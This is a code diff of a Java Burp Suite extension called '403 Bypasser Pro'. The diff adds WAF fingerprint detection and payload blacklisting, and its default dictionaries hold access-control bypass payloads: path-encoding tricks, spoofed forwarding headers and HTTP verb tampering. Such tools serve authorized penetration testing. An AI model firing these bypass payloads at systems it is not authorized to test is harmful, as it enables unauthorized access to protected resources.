@@ -13,7 +13,12 @@ import java.io.IOException;
 import java.net.URL;
 import java.nio.file.Files;
 import java.util.List;
-import java.util.*;
+import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.LinkedHashMap;
+import java.util.Map;
+import java.util.Set;
+import java.util.StringJoiner;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.CopyOnWriteArrayList;
 import java.util.concurrent.ExecutorService;
@@ -25,16 +30,16 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
 
     private IBurpExtenderCallbacks callbacks;
     private IExtensionHelpers helpers;
-    private final String extensionName = "403 Bypasser Pro (旗舰增强版)";
+    private final String extensionName = "403 Bypasser Pro (WAF智能完整版)";
 
     private JPanel mainPanel;
     private JTabbedPane tabs;
 
-    // --- UI Components ---
-    private DefaultTableModel urlTableModel, payloadTableModel;
-    private JTable urlTable, payloadTable;
+    // --- UI 组件 ---
+    private DefaultTableModel urlTableModel, payloadTableModel, wafTableModel;
+    private JTable urlTable, payloadTable, wafTable;
     private IMessageEditor requestViewer, responseViewer;
-    private JTable queryTable, headerTable, methodTable, excludeTable, whitelistTable;
+    private JTable queryTable, headerTable, methodTable, excludeTable, whitelistTable, regexTable, wafFingerprintTable;
 
     private JCheckBox chkEnableAutoScan, chkEnableWhitelist;
     private JCheckBox chkProxy, chkRepeater, chkIntruder;
@@ -42,34 +47,41 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
     private JTextField txtStatusCodes, txtRegex;
     private JCheckBox chkEnableRegex;
 
+    // WAF 专属控制开关
+    private JCheckBox chkEnableWafDetect, chkEnableDynamicBlacklist, chkEnableIpBanCheck;
+
     // --- 高并发数据存储区 ---
     private final List<ScanTask> scanTasks = new CopyOnWriteArrayList<>();
     private final Set<String> dedupCache = ConcurrentHashMap.newKeySet();
     private IHttpRequestResponse currentlyDisplayedItem;
     private final AtomicInteger taskCounter = new AtomicInteger(1);
-    private final ExecutorService executor = Executors.newFixedThreadPool(10);
+    private final ExecutorService executor = Executors.newFixedThreadPool(15);
     private File configDir;
 
-    // --- 线程安全的后台读取缓存 ---
+    // --- 线程安全的后台读取缓存 (Volatile 保证多线程可见性) ---
     private volatile boolean cAutoScan;
     private volatile boolean cWhitelistOnly;
     private volatile boolean cProxy, cRepeater, cIntruder;
     private volatile boolean cScanQuery, cScanHeader, cScanMethod;
     private volatile String cStatusCodes = "401, 403, 404";
-    private volatile boolean cEnableRegex;
-    private volatile String cRegexStr = "";
+    private volatile boolean cEnableRegex, cEnableWafDetect, cEnableDynamicBlacklist, cEnableIpBanCheck;
+    private volatile Pattern cRegexPattern = null;
+
     private volatile List<String> cQueryPayloads = new ArrayList<>();
     private volatile List<String> cHeaderPayloads = new ArrayList<>();
     private volatile List<String> cMethodPayloads = new ArrayList<>();
     private volatile List<String> cExcludeExts = new ArrayList<>();
     private volatile List<String> cWhitelist = new ArrayList<>();
+    private volatile List<String> cRegexKeywords = new ArrayList<>();
+    private volatile Map<String, Pattern> cWafPatterns = new LinkedHashMap<>();
 
-    // --- 默认字典 ---
+    // --- 默认字典库 ---
     private final List<String> defaultQueryPayloads = Arrays.asList(
             "/", "/*", "//", "/./", "/../", "..;/", "/..;/", "/..%3b/", "%3b", ";",
             ";%09", ";%09..", ";%09..;", "%00", "%09", "%20", "%23", "%2e", "%2f",
             "%252e", "%252f", "%2e%2e%2f", "..%2f", ".json", ".xml", ".html",
-            "..%00/", "..%0d/", "..%5c", "..%ff/", "%2e%2e%3b/", "*", "/%20"
+            "..%00/", "..%0d/", "..%5c", "..%ff/", "%2e%2e%3b/", "*", "/%20",
+            "/%2e/", "/%2e%2e/", "/;/;"
     );
     private final List<String> defaultHeaderPayloads = Arrays.asList(
             "Client-IP: 127.0.0.1", "X-Real-Ip: 127.0.0.1", "Redirect: 127.0.0.1",
@@ -77,17 +89,49 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
             "X-Forwarded-By: 127.0.0.1", "X-Forwarded-For: 127.0.0.1", "X-Forwarded-Host: 127.0.0.1",
             "X-Forwarded-Port: 80", "X-True-IP: 127.0.0.1", "X-Originating-IP: 127.0.0.1",
             "X-Remote-IP: 127.0.0.1", "X-Remote-Addr: 127.0.0.1", "X-Host: 127.0.0.1",
-            "X-Original-URL: /", "X-Rewrite-URL: /"
+            "X-Original-URL: /", "X-Rewrite-URL: /", "True-Client-IP: 127.0.0.1",
+            "X-Forwarded-Server: 127.0.0.1", "X-HTTP-Host-Override: 127.0.0.1", "X-Wap-Profile: 127.0.0.1"
     );
     private final List<String> defaultMethodPayloads = Arrays.asList(
             "GET -> POST", "POST -> GET", "HTTP/1.1 -> HTTP/1.0",
-            "GET -> OPTIONS", "GET -> TRACE", "GET -> HEAD"
+            "GET -> OPTIONS", "GET -> TRACE", "GET -> HEAD", "GET -> PUT", "POST -> PUT"
     );
     private final List<String> defaultExcludeExts = Arrays.asList(
             ".jpg", ".jpeg", ".png", ".gif", ".css", ".js", ".woff", ".woff2", ".ico",
-            ".svg", ".ttf", ".eot", ".mp4", ".mp3", ".avi", ".ts"
+            ".svg", ".ttf", ".eot", ".mp4", ".mp3", ".avi", ".ts", ".vue"
     );
-    private final List<String> defaultWhitelist = Arrays.asList("cnzz.com", "example");
+    private final List<String> defaultWhitelist = Arrays.asList(
+            "example.com", "test"
+    );
+    private final List<String> defaultRegexKeywords = Arrays.asList(
+            "未授权", "无权限", "权限不足", "拒绝访问", "非法请求", "拦截", "验证失败",
+            "登录已过期", "登录超时", "请先登录", "未登录", "签名错误", "无效的token",
+            "access denied", "unauthorized", "invalid token", "token expired",
+            "not login", "forbidden", "block", "waf", "illegal", "please login",
+            "authentication failed", "missing authorization"
+    );
+    private final List<String> defaultWafFingerprints = Arrays.asList(
+            "Cloudflare: (?i)(Server: cloudflare|cf-ray:|cloudflare-nginx)",
+            "阿里云盾: (?i)(errors\\.aliyun\\.com|yundun|Server: AliyunOS)",
+            "腾讯云WAF: (?i)(TencentWAF)",
+            "长亭SafeLine: (?i)(safeline)",
+            "安全狗: (?i)(WAF/2\\.0|Safedog|safedog-flow-item)",
+            "Imperva: (?i)(Server: imperva|X-Iinfo|incap_ses)",
+            "AWS WAF: (?i)(x-amz-cf-id|Server: awselb)",
+            "Akamai: (?i)(Server: AkamaiGHost)",
+            "F5 BIG-IP: (?i)(Server: BigIP|F5-TrafficShield)",
+            "360奇安信: (?i)(wangzhan\\.360\\.cn|X-Powered-By-360WZB)",
+            "创宇盾: (?i)(X-Cache: jiasule|ks-waf)",
+            "ModSecurity: (?i)(Mod_Security|NOYB)"
+    );
+
+    // --- WAF 智能引擎数据结构 ---
+    static class WafProfile {
+        String wafName;
+        boolean isIpBanned = false;
+        Set<String> blacklistedPoCs = ConcurrentHashMap.newKeySet();
+    }
+    private final Map<String, WafProfile> wafMap = new ConcurrentHashMap<>();
 
     @Override
     public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
@@ -95,12 +139,23 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         this.helpers = callbacks.getHelpers();
         callbacks.setExtensionName(extensionName);
 
+        // ================= 1. 打印专属启动 Logo =================
+        callbacks.printOutput("####################################################");
+        callbacks.printOutput("  403 Bypasser Pro v1.2");
+        callbacks.printOutput("  Author:  DLtest007");
+        callbacks.printOutput("  Github:  https://github.com/DLtest007/403Bypasser-Pro");
+        callbacks.printOutput("####################################################\n");
+
+        // ================= 2. 初始化本地配置目录 =================
+        // 注意：全局只声明一次 String userHome
         String userHome = System.getProperty("user.home");
         configDir = new File(userHome, ".403bypasser");
-        if (!configDir.exists()) { configDir.mkdirs(); }
+        if (!configDir.exists()) {
+            configDir.mkdirs();
+        }
 
+        // ================= 3. 启动 UI 与注册监听器 =================
         SwingUtilities.invokeLater(this::initUI);
-
         callbacks.registerHttpListener(this);
         callbacks.registerContextMenuFactory(this);
     }
@@ -109,7 +164,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         mainPanel = new JPanel(new BorderLayout());
         tabs = new JTabbedPane();
 
-        // ====== 1. Dashboard ======
+        // ====== 1. 扫描大盘 (Dashboard Tab) ======
         JPanel dashboardPanel = new JPanel(new BorderLayout());
         JSplitPane rootSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
         JSplitPane dataSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
@@ -124,27 +179,18 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         urlTable.setRowSorter(new TableRowSorter<>(urlTableModel));
         urlTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
         urlTable.getSelectionModel().addListSelectionListener(e -> {
-            if (!e.getValueIsAdjusting()) {
+            if (!e.getValueIsAdjusting() && urlTable.getSelectedRow() != -1) {
                 payloadTableModel.setRowCount(0);
-                int viewRow = urlTable.getSelectedRow();
-                if (viewRow != -1) {
-                    int modelRow = urlTable.convertRowIndexToModel(viewRow);
-                    ScanTask task = scanTasks.get(modelRow);
-                    for (PayloadResult pr : task.results) {
-                        payloadTableModel.addRow(new Object[]{pr.type, pr.payload, pr.newLen, pr.diff, pr.timeMs, pr.status});
-                    }
+                int modelRow = urlTable.convertRowIndexToModel(urlTable.getSelectedRow());
+                ScanTask task = scanTasks.get(modelRow);
+                for (PayloadResult pr : task.results) {
+                    payloadTableModel.addRow(new Object[]{pr.type, pr.payload, pr.newLen, pr.diff, pr.timeMs, pr.status});
                 }
             }
         });
         urlTable.getColumnModel().getColumn(0).setPreferredWidth(40);
         urlTable.getColumnModel().getColumn(1).setPreferredWidth(60);
         urlTable.getColumnModel().getColumn(2).setPreferredWidth(300);
-
-        JPanel urlPanel = new JPanel(new BorderLayout(0, 5));
-        JLabel lblScanned = new JLabel(" 已扫描接口 (Scanned Interfaces)");
-        lblScanned.setFont(lblScanned.getFont().deriveFont(Font.BOLD));
-        urlPanel.add(lblScanned, BorderLayout.NORTH);
-        urlPanel.add(new JScrollPane(urlTable), BorderLayout.CENTER);
 
         // --- Payload Table ---
         payloadTableModel = new DefaultTableModel(new String[]{"类型", "Payload", "新 Body 长度", "差异 (Diff)", "用时 (ms)", "状态码"}, 0) {
@@ -154,7 +200,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         payloadTable = new JTable(payloadTableModel);
         payloadTable.setRowSorter(new TableRowSorter<>(payloadTableModel));
 
-        DefaultTableCellRenderer diffRenderer = new DefaultTableCellRenderer() {
+        payloadTable.getColumnModel().getColumn(3).setCellRenderer(new DefaultTableCellRenderer() {
             @Override protected void setValue(Object value) {
                 if (value instanceof Integer) {
                     int diff = (Integer) value;
@@ -168,28 +214,27 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
                     }
                 } else { super.setValue(value); }
             }
-        };
-        payloadTable.getColumnModel().getColumn(3).setCellRenderer(diffRenderer);
+        });
 
         payloadTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
         payloadTable.getSelectionModel().addListSelectionListener(e -> {
-            if (!e.getValueIsAdjusting()) {
-                int uRow = urlTable.getSelectedRow();
-                int pRow = payloadTable.getSelectedRow();
-                if (uRow != -1 && pRow != -1) {
-                    ScanTask task = scanTasks.get(urlTable.convertRowIndexToModel(uRow));
-                    PayloadResult pr = task.results.get(payloadTable.convertRowIndexToModel(pRow));
-                    currentlyDisplayedItem = pr.reqRes;
-                    requestViewer.setMessage(pr.reqRes.getRequest(), true);
-                    if(pr.reqRes.getResponse() != null) {
-                        responseViewer.setMessage(pr.reqRes.getResponse(), false);
-                    } else {
-                        responseViewer.setMessage(new byte[0], false);
-                    }
-                }
+            if (!e.getValueIsAdjusting() && urlTable.getSelectedRow() != -1 && payloadTable.getSelectedRow() != -1) {
+                int uRow = urlTable.convertRowIndexToModel(urlTable.getSelectedRow());
+                int pRow = payloadTable.convertRowIndexToModel(payloadTable.getSelectedRow());
+                ScanTask task = scanTasks.get(uRow);
+                PayloadResult pr = task.results.get(pRow);
+                currentlyDisplayedItem = pr.reqRes;
+                requestViewer.setMessage(pr.reqRes.getRequest(), true);
+                responseViewer.setMessage(pr.reqRes.getResponse() != null ? pr.reqRes.getResponse() : new byte[0], false);
             }
         });
         payloadTable.getColumnModel().getColumn(1).setPreferredWidth(200);
+
+        JPanel urlPanel = new JPanel(new BorderLayout(0, 5));
+        JLabel lblUrl = new JLabel(" 已扫描接口 (Scanned Interfaces)");
+        lblUrl.setFont(lblUrl.getFont().deriveFont(Font.BOLD));
+        urlPanel.add(lblUrl, BorderLayout.NORTH);
+        urlPanel.add(new JScrollPane(urlTable), BorderLayout.CENTER);
 
         JPanel payloadPanel = new JPanel(new BorderLayout(0, 5));
         JLabel lblPayload = new JLabel(" 测试结果 (Payload Results)");
@@ -201,8 +246,6 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         topSplit.setRightComponent(payloadPanel);
         topSplit.setResizeWeight(0.4);
 
-        // Viewers
-        JSplitPane viewerSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
         IMessageEditorController controller = new IMessageEditorController() {
             public IHttpService getHttpService() { return currentlyDisplayedItem != null ? currentlyDisplayedItem.getHttpService() : null; }
             public byte[] getRequest() { return currentlyDisplayedItem != null ? currentlyDisplayedItem.getRequest() : null; }
@@ -211,6 +254,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         requestViewer = callbacks.createMessageEditor(controller, false);
         responseViewer = callbacks.createMessageEditor(controller, false);
 
+        JSplitPane viewerSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
         JPanel reqPanel = new JPanel(new BorderLayout(0, 5));
         JLabel lblReq = new JLabel(" 请求包 (Request)");
         lblReq.setFont(lblReq.getFont().deriveFont(Font.BOLD));
@@ -231,74 +275,77 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         dataSplit.setBottomComponent(viewerSplit);
         dataSplit.setResizeWeight(0.5);
 
-        // --- Control Panel ---
+        // --- 控制面板 (Control Panel) ---
         JPanel ctrlPanel = new JPanel();
         ctrlPanel.setLayout(new BoxLayout(ctrlPanel, BoxLayout.Y_AXIS));
         ctrlPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
 
-        JLabel lblCtrlTitle = new JLabel("▼ 1. 全局开关 (必须开启)");
+        JLabel lblCtrlTitle = new JLabel("▼ 1. 全局与白名单");
         lblCtrlTitle.setFont(lblCtrlTitle.getFont().deriveFont(Font.BOLD, 13f));
         ctrlPanel.add(lblCtrlTitle);
-        chkEnableAutoScan = new JCheckBox("允许插件后台监听并扫描流量", false);
+        chkEnableAutoScan = new JCheckBox("允许被动监听与扫描", false);
         chkEnableAutoScan.setForeground(new Color(200, 0, 0));
         ctrlPanel.add(chkEnableAutoScan);
-        ctrlPanel.add(Box.createVerticalStrut(15));
-
-        JLabel lblFilter = new JLabel("▼ 2. 目标白名单过滤");
-        lblFilter.setFont(lblFilter.getFont().deriveFont(Font.BOLD, 13f));
-        ctrlPanel.add(lblFilter);
-        chkEnableWhitelist = new JCheckBox("仅扫描白名单内域名 (强烈推荐)", false);
+        chkEnableWhitelist = new JCheckBox("开启白名单匹配 (推荐)", false);
         ctrlPanel.add(chkEnableWhitelist);
-        ctrlPanel.add(Box.createVerticalStrut(15));
 
-        JLabel lblMon = new JLabel("▼ 3. 抓取模块来源");
+        ctrlPanel.add(Box.createVerticalStrut(10));
+        JLabel lblMon = new JLabel("▼ 2. 抓取模块来源");
         lblMon.setFont(lblMon.getFont().deriveFont(Font.BOLD, 13f));
         ctrlPanel.add(lblMon);
         chkProxy = new JCheckBox("代理 (Proxy)", true); ctrlPanel.add(chkProxy);
         chkRepeater = new JCheckBox("重放器 (Repeater)", true); ctrlPanel.add(chkRepeater);
         chkIntruder = new JCheckBox("Intruder", false); ctrlPanel.add(chkIntruder);
-        ctrlPanel.add(Box.createVerticalStrut(15));
 
-        JLabel lblEnabled = new JLabel("▼ 4. 启用的扫描方式");
+        ctrlPanel.add(Box.createVerticalStrut(10));
+        JLabel lblEnabled = new JLabel("▼ 3. 扫描字典开启配置");
         lblEnabled.setFont(lblEnabled.getFont().deriveFont(Font.BOLD, 13f));
         ctrlPanel.add(lblEnabled);
-        chkScanQuery = new JCheckBox("路径字典 (Query)", true); ctrlPanel.add(chkScanQuery);
-        chkScanHeader = new JCheckBox("请求头字典 (Header)", true); ctrlPanel.add(chkScanHeader);
-        chkScanMethod = new JCheckBox("动词转换 (Method)", true); ctrlPanel.add(chkScanMethod);
-        ctrlPanel.add(Box.createVerticalStrut(15));
+        chkScanQuery = new JCheckBox("路径字典 Fuzz (Query)", true); ctrlPanel.add(chkScanQuery);
+        chkScanHeader = new JCheckBox("请求头绕过 (Header)", true); ctrlPanel.add(chkScanHeader);
+        chkScanMethod = new JCheckBox("动词篡改降级 (Method)", true); ctrlPanel.add(chkScanMethod);
 
-        JLabel lblTrig = new JLabel("▼ 5. 触发条件 (命中才扫)");
+        ctrlPanel.add(Box.createVerticalStrut(10));
+        JLabel lblWaf = new JLabel("▼ 4. WAF 智能防御对抗机制");
+        lblWaf.setFont(lblWaf.getFont().deriveFont(Font.BOLD, 13f));
+        ctrlPanel.add(lblWaf);
+        chkEnableWafDetect = new JCheckBox("启用 WAF 识别与拦截接管", true);
+        chkEnableWafDetect.setForeground(new Color(200, 50, 0));
+        ctrlPanel.add(chkEnableWafDetect);
+        chkEnableDynamicBlacklist = new JCheckBox("启用 PoC 动态拉黑 (防墙)", true);
+        ctrlPanel.add(chkEnableDynamicBlacklist);
+        chkEnableIpBanCheck = new JCheckBox("启用 IP 封禁智能探活验证", true);
+        ctrlPanel.add(chkEnableIpBanCheck);
+
+        ctrlPanel.add(Box.createVerticalStrut(10));
+        JLabel lblTrig = new JLabel("▼ 5. 扫描触发条件");
         lblTrig.setFont(lblTrig.getFont().deriveFont(Font.BOLD, 13f));
         ctrlPanel.add(lblTrig);
         ctrlPanel.add(new JLabel("目标状态码 (用逗号分隔):"));
-        txtStatusCodes = new JTextField("401, 403, 404"); txtStatusCodes.setMaximumSize(new Dimension(250, 30)); ctrlPanel.add(txtStatusCodes);
-        ctrlPanel.add(Box.createVerticalStrut(10));
-        chkEnableRegex = new JCheckBox("启用响应包正则匹配 (查漏网之鱼)", true); ctrlPanel.add(chkEnableRegex);
-        ctrlPanel.add(new JLabel("提取正则表达式:"));
-        txtRegex = new JTextField("(?i)(未授权|access denied|unauthorized|invalid token|expired|not login|权限不足|forbidden|block|waf|illegal|拦截)");
-        txtRegex.setMaximumSize(new Dimension(250, 30)); ctrlPanel.add(txtRegex);
-        ctrlPanel.add(Box.createVerticalStrut(20));
+        txtStatusCodes = new JTextField("401, 403, 404");
+        txtStatusCodes.setMaximumSize(new Dimension(250, 30));
+        ctrlPanel.add(txtStatusCodes);
+        ctrlPanel.add(Box.createVerticalStrut(5));
+        chkEnableRegex = new JCheckBox("启用假200伪装抓取", true);
+        ctrlPanel.add(chkEnableRegex);
 
+        ctrlPanel.add(Box.createVerticalStrut(15));
         JLabel lblData = new JLabel("▼ 6. 数据管理");
         lblData.setFont(lblData.getFont().deriveFont(Font.BOLD, 13f));
         ctrlPanel.add(lblData);
-        JButton btnClearCache = new JButton("清空去重缓存 (可重新扫老接口)");
+        JButton btnClearCache = new JButton("清空去重缓存 (可重扫老接口)");
         btnClearCache.addActionListener(e -> {
             dedupCache.clear();
-            callbacks.printOutput("[*] 去重缓存已清空，重新发包即可再次扫描！");
+            callbacks.printOutput("[*] 去重缓存已清空！");
         });
         ctrlPanel.add(btnClearCache);
         ctrlPanel.add(Box.createVerticalStrut(5));
-
-        JButton btnClearData = new JButton("清空所有扫描数据列表");
+        JButton btnClearData = new JButton("清空所有扫描与WAF缓存");
         btnClearData.addActionListener(e -> {
-            scanTasks.clear();
-            urlTableModel.setRowCount(0);
-            payloadTableModel.setRowCount(0);
-            requestViewer.setMessage(new byte[0], true);
-            responseViewer.setMessage(new byte[0], false);
-            dedupCache.clear();
-            taskCounter.set(1);
+            scanTasks.clear(); urlTableModel.setRowCount(0); payloadTableModel.setRowCount(0);
+            dedupCache.clear(); wafMap.clear(); wafTableModel.setRowCount(0); taskCounter.set(1);
+            requestViewer.setMessage(new byte[0], true); responseViewer.setMessage(new byte[0], false);
+            callbacks.printOutput("[*] 所有缓存已完全重置！");
         });
         ctrlPanel.add(btnClearData);
 
@@ -307,19 +354,60 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         rootSplit.setResizeWeight(0.85);
         dashboardPanel.add(rootSplit, BorderLayout.CENTER);
 
-        // ====== 2. Config Panel ======
-        JPanel configPanel = new JPanel(new GridLayout(3, 2, 10, 10));
-        queryTable = buildConfigModule(configPanel, "路径/参数字典 (Query)", "bypasser_query.txt", defaultQueryPayloads);
-        headerTable = buildConfigModule(configPanel, "请求头字典 (Header)", "bypasser_header.txt", defaultHeaderPayloads);
-        methodTable = buildConfigModule(configPanel, "请求方法转换 (Method: A -> B)", "bypasser_method.txt", defaultMethodPayloads);
-        excludeTable = buildConfigModule(configPanel, "排除后缀 (Exclude)", "bypasser_ext.txt", defaultExcludeExts);
+        // ====== 2. WAF 情报中心 Tab ======
+        JPanel wafPanel = new JPanel(new BorderLayout(5, 5));
+        wafPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
+        wafTableModel = new DefaultTableModel(new String[]{"目标站点 (Host)", "识别的 WAF 指纹", "IP 被墙状态", "被动态拉黑的 PoC 数量"}, 0) {
+            @Override public boolean isCellEditable(int row, int column) { return false; }
+        };
+        wafTable = new JTable(wafTableModel);
+        wafTable.setRowSorter(new TableRowSorter<>(wafTableModel));
+        wafTable.getColumnModel().getColumn(2).setCellRenderer(new DefaultTableCellRenderer() {
+            @Override protected void setValue(Object value) {
+                setText(value != null ? value.toString() : "");
+                if ("[危险] 已被墙".equals(value)) {
+                    setForeground(Color.RED); setFont(getFont().deriveFont(Font.BOLD));
+                } else {
+                    setForeground(new Color(0, 150, 0)); setFont(getFont().deriveFont(Font.PLAIN));
+                }
+            }
+        });
+        JLabel lblWafCenter = new JLabel(" WAF 动态识别与拦截记录库");
+        lblWafCenter.setFont(lblWafCenter.getFont().deriveFont(Font.BOLD));
+        wafPanel.add(lblWafCenter, BorderLayout.NORTH);
+        wafPanel.add(new JScrollPane(wafTable), BorderLayout.CENTER);
+
+        // ====== 3. 配置中心 (Configuration Panel) 4x2 网格 ======
+        JPanel configPanel = new JPanel(new GridLayout(4, 2, 10, 10));
+        queryTable = buildConfigModule(configPanel, "路径与参数畸变 (Query)", "bypasser_query.txt", defaultQueryPayloads);
+        headerTable = buildConfigModule(configPanel, "请求头越权与伪造 (Header)", "bypasser_header.txt", defaultHeaderPayloads);
+        methodTable = buildConfigModule(configPanel, "动词篡改与协议转换 (Method)", "bypasser_method.txt", defaultMethodPayloads);
+        excludeTable = buildConfigModule(configPanel, "静态资源放行 (Exclude Exts)", "bypasser_ext.txt", defaultExcludeExts);
         whitelistTable = buildConfigModule(configPanel, "域名白名单关键字 (Whitelist)", "bypasser_whitelist.txt", defaultWhitelist);
+        regexTable = buildConfigModule(configPanel, "假200匹配特征 (Regex Keywords)", "bypasser_regex.txt", defaultRegexKeywords);
+        wafFingerprintTable = buildConfigModule(configPanel, "自定义WAF指纹库 (格式 Name:Regex)", "bypasser_waf.txt", defaultWafFingerprints);
+
+        // 最后一个格子显示帮助说明
+        JPanel helpPanel = new JPanel(new BorderLayout());
+        helpPanel.setBorder(BorderFactory.createTitledBorder("字典编写指南"));
+        JTextArea helpText = new JTextArea(
+                "1. 假200正则：支持填入任意中文或特殊字符（如 {\"code\":-1}），程序自动安全转义。\n\n" +
+                        "2. WAF指纹库：必须严格按照 [名称:正则表达式] 格式填写。\n" +
+                        "   例如 -> Cloudflare: (?i)(cf-ray|cloudflare)\n\n" +
+                        "3. 所有字典修改完毕后，离开输入框或敲击回车，即可瞬间热加载至内存，无需重启插件。"
+        );
+        helpText.setEditable(false);
+        helpText.setBackground(helpPanel.getBackground());
+        helpText.setFont(helpText.getFont().deriveFont(12f));
+        helpPanel.add(new JScrollPane(helpText), BorderLayout.CENTER);
+        configPanel.add(helpPanel);
 
         tabs.addTab("扫描大盘 (Dashboard)", dashboardPanel);
+        tabs.addTab("WAF 拦截情报中心", wafPanel);
         tabs.addTab("配置中心 (Configuration)", configPanel);
 
         JPanel bottomInfoPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
-        JLabel infoLabel = new JLabel(" 配置文件保存在: " + configDir.getAbsolutePath() + " | (请随时查看 Extender -> Output 控制台获取丢包原因日志)");
+        JLabel infoLabel = new JLabel(" 配置文件保存在: " + configDir.getAbsolutePath() + " | (实时多线程内存隔离同步已开启)");
         infoLabel.setForeground(Color.GRAY);
         bottomInfoPanel.add(infoLabel);
 
@@ -343,6 +431,9 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         chkScanHeader.addActionListener(syncAction);
         chkScanMethod.addActionListener(syncAction);
         chkEnableRegex.addActionListener(syncAction);
+        chkEnableWafDetect.addActionListener(syncAction);
+        chkEnableDynamicBlacklist.addActionListener(syncAction);
+        chkEnableIpBanCheck.addActionListener(syncAction);
 
         DocumentListener docSync = new DocumentListener() {
             @Override public void insertUpdate(DocumentEvent e) { updateCachesFromUI(); }
@@ -350,17 +441,17 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
             @Override public void changedUpdate(DocumentEvent e) { updateCachesFromUI(); }
         };
         txtStatusCodes.getDocument().addDocumentListener(docSync);
-        txtRegex.getDocument().addDocumentListener(docSync);
     }
 
     private void updateCachesFromUI() {
         SwingUtilities.invokeLater(() -> {
-            // 核心修复：强制取消所有表格的闪烁编辑状态，确保刚刚修改的 cnzz 被保存到内存
             if (whitelistTable.isEditing()) whitelistTable.getCellEditor().stopCellEditing();
             if (queryTable.isEditing()) queryTable.getCellEditor().stopCellEditing();
             if (headerTable.isEditing()) headerTable.getCellEditor().stopCellEditing();
             if (methodTable.isEditing()) methodTable.getCellEditor().stopCellEditing();
             if (excludeTable.isEditing()) excludeTable.getCellEditor().stopCellEditing();
+            if (regexTable.isEditing()) regexTable.getCellEditor().stopCellEditing();
+            if (wafFingerprintTable.isEditing()) wafFingerprintTable.getCellEditor().stopCellEditing();
 
             cAutoScan = chkEnableAutoScan.isSelected();
             cWhitelistOnly = chkEnableWhitelist.isSelected();
@@ -372,13 +463,44 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
             cScanMethod = chkScanMethod.isSelected();
             cStatusCodes = txtStatusCodes.getText();
             cEnableRegex = chkEnableRegex.isSelected();
-            cRegexStr = txtRegex.getText();
 
-            cQueryPayloads = new ArrayList<>(getTableData(queryTable));
-            cHeaderPayloads = new ArrayList<>(getTableData(headerTable));
-            cMethodPayloads = new ArrayList<>(getTableData(methodTable));
-            cExcludeExts = new ArrayList<>(getTableData(excludeTable));
-            cWhitelist = new ArrayList<>(getTableData(whitelistTable));
+            cEnableWafDetect = chkEnableWafDetect.isSelected();
+            cEnableDynamicBlacklist = chkEnableDynamicBlacklist.isSelected();
+            cEnableIpBanCheck = chkEnableIpBanCheck.isSelected();
+
+            cQueryPayloads = getTableData(queryTable);
+            cHeaderPayloads = getTableData(headerTable);
+            cMethodPayloads = getTableData(methodTable);
+            cExcludeExts = getTableData(excludeTable);
+            cWhitelist = getTableData(whitelistTable);
+            cRegexKeywords = getTableData(regexTable);
+
+            // 1. 动态编译假 200 正则引擎
+            if (cEnableRegex && !cRegexKeywords.isEmpty()) {
+                StringJoiner sj = new StringJoiner("|");
+                for (String kw : cRegexKeywords) {
+                    if (!kw.trim().isEmpty()) sj.add(Pattern.quote(kw.trim()));
+                }
+                cRegexPattern = sj.length() > 0 ? Pattern.compile("(?i)(" + sj.toString() + ")") : null;
+            } else {
+                cRegexPattern = null;
+            }
+
+            // 2. 动态编译 WAF 指纹库引擎
+            Map<String, Pattern> tempWafPatterns = new LinkedHashMap<>();
+            for (String line : getTableData(wafFingerprintTable)) {
+                int idx = line.indexOf(":");
+                if (idx > 0) {
+                    String name = line.substring(0, idx).trim();
+                    String reg = line.substring(idx + 1).trim();
+                    try {
+                        tempWafPatterns.put(name, Pattern.compile(reg));
+                    } catch (Exception ex) {
+                        callbacks.printError("[!] WAF 正则编译失败, 已跳过 [" + name + "]: " + ex.getMessage());
+                    }
+                }
+            }
+            cWafPatterns = tempWafPatterns;
         });
     }
 
@@ -397,10 +519,12 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         }
 
         DefaultTableModel model = new DefaultTableModel(new String[]{title}, 0);
-        for (String item : data) { if (!item.trim().isEmpty()) model.addRow(new Object[]{item.trim()}); }
+        for (String item : data) {
+            if (!item.trim().isEmpty()) model.addRow(new Object[]{item.trim()});
+        }
         JTable table = new JTable(model);
 
-        // 当发生任何修改时（含双击修改），自动写文件并更新内存
+        // 绑定数据改动监听器，确保双击编辑后自动保存并同步内存
         model.addTableModelListener(e -> saveConfig(table, file));
 
         panel.add(new JScrollPane(table), BorderLayout.CENTER);
@@ -424,11 +548,14 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContex
         JButton btnRemove = new JButton("删除");
         btnRemove.addActionListener(e -> {
             int[] rows = table.getSelectedRows();
-            for (int i = rows.length - 1; i >= 0; i--) { model.removeRow(rows[i]); }
+            for (int i = rows.length - 1; i >= 0; i--) {
+                model.removeRow(rows[i]);
+            }
         });
 
         btns.add(btnAdd); btns.add(btnClear); btns.add(btnRemove);
-        bot.add(txt, BorderLayout.CENTER); bot.add(btns, BorderLayout.SOUTH);
+        bot.add(txt, BorderLayout.CENTER);
